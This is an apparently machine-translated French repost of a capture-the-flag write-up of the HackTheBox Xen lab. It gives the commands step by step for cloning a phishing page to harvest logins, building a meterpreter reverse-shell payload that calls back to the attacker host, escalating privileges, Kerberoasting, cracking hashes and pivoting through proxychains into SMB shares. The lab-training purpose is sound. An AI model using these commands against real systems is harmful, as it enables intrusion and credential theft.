<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§µüèº ü§πüèø ü§≥üèø Fin de partie HackTheBox. Proc√©dure pas √† pas Xen Lab. Pentest Active Directory üë®üèΩ‚Äçüöí üë©üèæ‚Äçüîß üëãüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dans cet article, nous analyserons le passage non seulement d'une voiture, mais de tout un mini-laboratoire du site HackTheBox . 
 
 Comme indiqu√© dan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Fin de partie HackTheBox. Proc√©dure pas √† pas Xen Lab. Pentest Active Directory</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/506980/"><img src="https://habrastorage.org/webt/-g/rq/3z/-grq3z8cvxjlhbkdm-hjxkdwcqc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous analyserons le passage non seulement d'une voiture, mais de tout un mini-laboratoire du site </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme indiqu√© dans la description, Xen est con√ßu pour tester les comp√©tences √† toutes les √©tapes des attaques dans un petit environnement Active Directory. </font><font style="vertical-align: inherit;">L'objectif est de compromettre un h√¥te accessible, d'augmenter les privil√®ges et, finalement, de compromettre l'ensemble du domaine, tout en collectant 6 drapeaux. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voir une discussion d'un autre laboratoire d'op√©rations offensives professionnelles </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommand√© de ne pas se connecter √† partir d'un ordinateur professionnel ou d'un h√¥te o√π les donn√©es importantes pour vous sont disponibles, car vous entrez dans un r√©seau priv√© avec des personnes qui connaissent quelque chose dans le domaine de la s√©curit√© de l'information :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Intro</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette fin de partie se compose de 6 machines et contient 6 drapeaux. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qi/7m/jd/qi7mjdxucpxhje-cia76n_y_uio.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La description et l'adresse de l'h√¥te disponible sont √©galement fournies. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ks/h6/wl/ksh6wls_-pv2e2rmk0xbg_cc-x4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Commen√ßons!</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau de violation</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP de 10.13.38.12, que j'ajoute √† / etc / hosts. </font></font><br>
<code>10.13.38.12 xen.htb</code><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP √† partir de l'interface tun0 √† une vitesse de 500 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/38/-e/xn/38-exn8blvfxcaqrpue5ekc_hwk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, pour des informations plus d√©taill√©es sur les services qui fonctionnent sur les ports, nous allons ex√©cuter une analyse avec l'option -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A xen.htb -p25,80,443</code></pre><br>
<img src="https://habrastorage.org/webt/28/b1/pr/28b1pr7-okzchmg-ci1ggbaxpow.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, nous avons IIS et SMTP. Dans le m√™me temps, il existe la possibilit√© de connexions HTTP et HTTPS sur les ports 80 et 443. Voyons le Web - nous sommes accueillis par un simple site. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/up/in/cc/upinccvylfqvhode8at6xivs-ny.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il n'y a rien d'int√©ressant, √† part le lien ¬´Rejoignez l'√©quipe¬ª, nous indiquant l'adresse email jointheteam@humongousretail.com. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1l/n2/k_/1ln2k_xo-b0vaxpdi1dhl2g2tqa.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Passons en revue les r√©pertoires. J'utilise gobuster pour cela. Dans les param√®tres, nous indiquons le nombre de flux 128 (-t), URL (-u), dictionnaire (-w) et extensions qui nous int√©ressent (-x).</font></font><br>
<br>
<pre><code class="bash hljs">gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx</code></pre><br>
<img src="https://habrastorage.org/webt/0w/rp/et/0wrpetqsiwo1s2ylorprhhgugce.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons des r√©pertoires int√©ressants. Le code 401 indique la pr√©sence de l'authentification HTTP, regardons √† distance. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xo/du/8e/xodu8eovut5bbieahdwnatbyqqg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous acceptons et demandons des informations d'identification. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5v/e0/1w/5ve01wb7xkwxjghn9laebsvcsxm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons besoin d'informations d'identification. Avec cela, j'ai d√©cid√© de retourner sur le serveur SMTP et de trier les noms d'utilisateurs (je recommande d'utiliser celui que Metasploit propose comme liste de noms). Nous le faisons en utilisant smtp-user-enum.</font></font><br>
<br>
<pre><code class="bash hljs">smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb</code></pre><br>
<img src="https://habrastorage.org/webt/6x/vm/nf/6xvmnfxy7zrbwymwuy53mtsjub4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous trouvons 4 adresses e-mail. Puisque nous voyons le courrier du service informatique, nous pouvons envoyer un message √† tous les autres utilisateurs en leur nom. Copions la page d'autorisation √† distance, faisons-en une fausse et envoyons √† tous les utilisateurs la fausse adresse du portail distant (en fait, j'ai √©t√© tr√®s surpris quand il s'est av√©r√© que c'√©tait le bon vecteur). </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez faire une copie compl√®te de la page en utilisant l'extension SingleFile pour Firefox. Ensuite, jetez un ≈ìil au code source et modifiez les donn√©es du formulaire. La premi√®re consiste √† changer l'adresse √† laquelle les informations d'identification seront envoy√©es, j'ai d√©fini mon h√¥te et le port 81. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ki/_g/d3/ki_gd3wwmdo9rn2ywyixxrzlpdw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et ajoutez Soumettre pour envoyer les donn√©es. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ad/zf/bx/adzfbxlqlhef4csitqunfnqmxks.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez maintenant netcat pour √©couter sur le port 81, activez le serveur Web et faites r√©f√©rence au fichier modifi√© sous le nom index.html.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jt/td/om/jttdomb7-i7rlqdhj4uasj9a8le.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/uf/-7/ud/uf-7ud36kzhbi3qvwd9yjlap2sw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√áa marche! </font><font style="vertical-align: inherit;">Envoyons un message sur la modification de l'adresse du portail. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/kf/q6/nfkfq6zng1tkm8owwsztsoyisfq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais le vecteur est correct, mais l'ex√©cution n'est pas tr√®s) Nous obtenons donc les donn√©es, mais sous forme robotique sur le port 80. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/de/xw/dp/dexwdpkgpo_oqb4ca2vczmwwqzi.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, nous collectons tous les comptes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et maintenant, nous allons √† distance. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mv/oq/v2/mvoqv2pe00qndtibx9aeprwh-uq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous proposons d'enregistrer le fichier ICA. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yd/ke/a3/ydkea3fwsacwjzdcfe6qptwo1ra.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, j'ai install√© l'extension pour Chromium. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/uf/nc/b4/ufncb4a2m0qdb2czjakbke5i9v4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et connect√© en tant que pmorgan (VDESKTOP3). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/o8/ke/gx/o8kegx9kxnfiyskutyymimonhwo.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/a4/gb/1o/a4gb1of_eannxkf2gdhb-ra4cg8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous faisons de m√™me avec les autres utilisateurs. </font><font style="vertical-align: inherit;">Et r√©compensez trouver le premier drapeau. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/1z/vs/ig/1zvsigpck-o1os7hmzs70jecape.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et louez-le. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yw/ii/9n/ywii9nxpta3h-scvghrdis9gpow.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et enregistrez les informations collect√©es.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/as/ow/xd/asowxdq9r7mltqwhny2jatoh8ky.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D√©ployer l'indicateur</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous remarquerez peut-√™tre que les syst√®mes d'exploitation ne sont pas les plus r√©cents, il doit donc y avoir des exploits. </font><font style="vertical-align: inherit;">Jetons la coque m√®tre m√®tre. </font><font style="vertical-align: inherit;">Cr√©ez d'abord une charge.</font></font><br>
<br>
<pre><code class="bash hljs">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.14.9 LPORT=3434 -f exe &gt; s.exe</code></pre><br>
<img src="https://habrastorage.org/webt/l6/cw/fp/l6cwfpozbfayv9egysl_lshdw-o.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez maintenant l'√©couteur metasploit.</font></font><br>
<br>
<pre><code class="bash hljs">handler -H 10.14.14.9 -P 3434 -p windows/x64/meterpreter/reverse_tcp</code></pre><br>
<img src="https://habrastorage.org/webt/af/rg/xh/afrgxhmdhrqsctrusvic-hftrqy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous passons par le navigateur sur la machine cible, t√©l√©chargeons et ex√©cutons le chargement. </font><font style="vertical-align: inherit;">Dans la fen√™tre Metasploit, notez la connexion lors de la premi√®re session. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gk/95/hl/gk95hlyj70r7tqijdrcc3cdpi9g.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/hp/cs/g-/hpcsg-39centm7wanbtccngaqa0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, nous listons tous les exploits pour LPE. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ai/_l/nj/ai_lnjg4to9h_7u5uf4yl706fjw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et il y en a quelques-uns. </font><font style="vertical-align: inherit;">Utilisons le premier, il vous permettra d'obtenir le contexte du syst√®me. </font><font style="vertical-align: inherit;">Lancez un nouvel √©couteur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7t/bt/qe/7tbtqeoikcykli7ck9tategndxk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous utilisons l'exploit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3x/oz/pa/3xozpavk13cms-vl_yhxwy7a0rk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La deuxi√®me session s'ouvre dans le cadre de SYSTEM. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cg/qi/uh/cgqiuh4chvqmax4smhxkopyae34.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
V√©rifions le drapeau. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/lq/rn/4m/lqrn4m6ruh6a29ufxfmffi8xjvw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et prends-le. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2m/_g/ct/2m_gctbxaccolc792cmxvfb5bgi.png"><br>
<br>
<img src="https://habrastorage.org/webt/ty/fy/yv/tyfyyv-vw0yeo5eid8_gy4fwr4i.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si facile de passer un autre drapeau. </font><font style="vertical-align: inherit;">Nous allons plus loin.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau fant√¥me</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour une exploration plus approfondie, il est pratique d'utiliser PowerShell, et encore plus pratique de travailler via PowerShell Empire (√† propos duquel j'ai √©crit </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). </font><font style="vertical-align: inherit;">Ouvrons la session, pour cela cr√©ez d'abord un lanceur http et PS pour cela.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; listeners<font></font>
&gt; uselistener http<font></font>
&gt; <span class="hljs-built_in">set</span> Host 10.14.14.9<font></font>
&gt; <span class="hljs-built_in">set</span> Port 5656<font></font>
&gt; execute<font></font>
&gt; back<font></font>
&gt; launcher powershell http</code></pre><br>
<img src="https://habrastorage.org/webt/nw/h8/k_/nwh8k_g7pvp4d25k6mcm_g5ase0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Enregistrez le lanceur dans le fichier s.ps1. </font><font style="vertical-align: inherit;">Pour l'ex√©cuter √† partir de la m√©moire via meterpreter, vous devez charger le module PowerShell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xe/hf/0m/xehf0mmdd6b0-hmnfbbqivm45p0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et ex√©cutez powershell_import. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-f/nw/vv/-fnwvvmgxgd2stpsoceiizkfxhu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans la fen√™tre Empire, nous trouvons l'agent cr√©√©. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/f2/cm/7m/f2cm7mexe3pdgwtdgc_mghacli0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour un travail pratique, renommez-le par le nom du poste de travail et passez en mode interactif. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ne/vj/oh/nevjoh8xwwovniicwob5gp6k-6u.png"><br>
<br>
<img src="https://habrastorage.org/webt/hj/uc/n3/hjucn3yy2uihhkibe99yoamwpfi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour l'intelligence, nous devons d√©finir un contr√¥leur de domaine. </font><font style="vertical-align: inherit;">Nous le ferons √† l'aide d'un merveilleux module get_domain_controller de la section situational_awareness.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_domain_controller<font></font>
&gt; run<font></font>
</code></pre><br>
<img src="https://habrastorage.org/webt/pf/xe/61/pfxe61ftwboyhaqczuzu16huiho.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous obtenons donc des informations sur le contr√¥leur de domaine. </font><font style="vertical-align: inherit;">Maintenant, listons les utilisateurs du domaine. </font><font style="vertical-align: inherit;">√Ä ce stade, je dois obtenir les noms de compte et la valeur de la propri√©t√© AdminCount pour identifier imm√©diatement les utilisateurs privil√©gi√©s.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties samaccountname,admincount<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/ep/bm/8n/epbm8n-0pxbqjkx8ugmru5mx84q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
V√©rifions imm√©diatement les SPN pour d√©terminer si le Kerberoasting est possible.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/get_user<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> Properties serviceprincipalname<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/24/tu/qt/24tuqtogjlqw_wyj_wtkmirvjjq.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et il y a SPN! </font><font style="vertical-align: inherit;">Faisons Kerberoasting en utilisant le m√™me Empire. </font><font style="vertical-align: inherit;">Sp√©cifiez le format de sortie - hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule credentials/invoke_kerberoast<font></font>
&gt; <span class="hljs-built_in">set</span> OutputFormat Hashcat<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/fc/rt/n3/fcrtn3wmff8er48hsi4ck4epipe.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous obtenons le hachage utilisateur. </font><font style="vertical-align: inherit;">Maintenant, parcourez le hashcat.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 -a 0 krb.hash rockyou.txt --force</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ce mot de passe est introuvable dans le dictionnaire rockyou, j'ai donc v√©rifi√© tous les dictionnaires de Seclists. </font><font style="vertical-align: inherit;">Mais cette option a √©galement √©chou√©. </font><font style="vertical-align: inherit;">La derni√®re option consiste √† utiliser </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">les r√®gles NSA</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jx/zh/kx/jxzhkxufm6pnpkkqjbqpe-fmj-k.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Comme pr√©sent√© dans le r√©f√©rentiel, la plong√©e est la meilleure option, nous utilisons donc sa deuxi√®me version.</font></font><br>
<br>
<pre><code class="bash hljs">hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2</code></pre><br>
<img src="https://habrastorage.org/webt/8t/m8/yy/8tm8yyoriogouhedrvjvixunnc4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous obtenons le mot de passe de cet utilisateur. </font><font style="vertical-align: inherit;">Pour de nouvelles avanc√©es, analysons le r√©seau local. </font><font style="vertical-align: inherit;">Pour ce faire, il est pr√©f√©rable d'utiliser l'analyse ARP, car ICMP peut √™tre bloqu√©. </font><font style="vertical-align: inherit;">Le module arpscan nous y aidera: nous connaissons l'adresse et le masque du r√©seau, nous allons donc d√©finir la gamme d'h√¥tes.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/arpscan<font></font>
&gt; <span class="hljs-built_in">set</span> Range 172.16.249.0-172.16.249.255<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/7f/vh/qd/7fvhqd_c2vdhwqryakt7yi7kaxu.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Donc ... De cette liste, nous ne connaissons pas deux h√¥tes: 201 et 202. V√©rifions les ressources partag√©es dans le domaine. </font><font style="vertical-align: inherit;">√Ä partir des param√®tres, nous n'avons besoin que de l'adresse du contr√¥leur de domaine.</font></font><br>
<br>
<pre><code class="bash hljs">&gt; usemodule situational_awareness/network/powerview/share_finder<font></font>
&gt; <span class="hljs-built_in">set</span> Server DC.htb.local<font></font>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/rs/p3/6d/rsp36dpdijzbbrioueihsptddj0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√Ä chaque analyse, notre compr√©hension du r√©seau s'√©largit, d√©couvrons le type d'h√¥te CITRIX.htb.local. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cu/rk/m0/curkm01lzbyve769e7kdt7jjao4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voici les informations que nous accumulons. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/zd/8z/sdzd8z_kll5ijcesm_asfi6xqse.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour interagir avec les ressources du r√©seau interne, nous devons configurer le tunnel. </font><font style="vertical-align: inherit;">Nous le ferons dans la session meterpreter active en utilisant la commande autoroute, et sp√©cifierons l'adresse r√©seau interne et le masque en tant que param√®tre (avec le param√®tre -p nous pouvons v√©rifier les routes actives).</font></font><br>
<br>
<pre><code class="bash hljs">run autoroute -s 172.16.249.0/24 </code></pre><br>
<img src="https://habrastorage.org/webt/tn/tu/9y/tntu9y40tdn28avzmqtgl3o0ffw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant que nous avons ajout√© l'itin√©raire vers le r√©seau cible, nous allons utiliser l'outil socks4a depuis l'int√©rieur de la plateforme. </font><font style="vertical-align: inherit;">Le module auxiliaire auxiliaire / serveur / socks4a fournit un serveur proxy qui utilise l'infrastructure de routage Metasploit que nous avons cr√©√©e pour relayer les connexions. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-v/_j/0b/-v_j0bfvhwes3e1slvn42fwceqi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et en tant que client-redirecteur, nous utilisons des cha√Ænes proxy. </font><font style="vertical-align: inherit;">Modifiez sa configuration /etc/proxychains.conf, en sp√©cifiant le port d√©fini par metasploit (le port par d√©faut est 1080). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/cy/_5/oh/cy_5ohot9iirrdzik2qssk8hj4a.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et pour l'utilisateur trouv√©, le r√©pertoire Citrix $ est lisible. </font><font style="vertical-align: inherit;">√âtant donn√© que les cha√Ænes proxy affichent les informations de connexion, nous les supprimons √† l'aide de la redirection 2&gt; / dev / null.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local 172.16.249.201 --share <span class="hljs-string">"Citrix$"</span> --shares 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/qv/nr/ol/qvnroleugjrgp-i5izk_ovbpdps.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons tout ce qui est √† notre disposition sur cette ressource.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains smbmap -u mturner -p <span class="hljs-string">'4install!'</span> -d htb.local -H 172.16.249.201 -R 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/mj/g3/-n/mjg3-n6art569eklzc6dsoqx_fy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous retrouvons le drapeau ainsi que le fichier ppk. </font><font style="vertical-align: inherit;">Obtenons tous les fichiers.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!</code></pre><br>
<img src="https://habrastorage.org/webt/bi/s2/hw/bis2hwyvpobzvdkqykpbac_wfz0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lors de la connexion, nous obtenons une erreur qui peut √™tre √©limin√©e en sp√©cifiant l'option de protocole client min.</font></font><br>
<br>
<pre><code class="bash hljs">sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option=<span class="hljs-string">'client min protocol=NT1'</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/vn/yi/bh/vnyibhq9ui9jd9-smv92jserdqg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et remets le drapeau.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/zy/o3/uy/zyo3uyt0kbvkkijgwr_vdwnaa5i.png"><br>
<br>
<img src="https://habrastorage.org/webt/js/y2/pp/jsy2ppljrcwqjfvit23y4pzisig.png"><br>
<br>
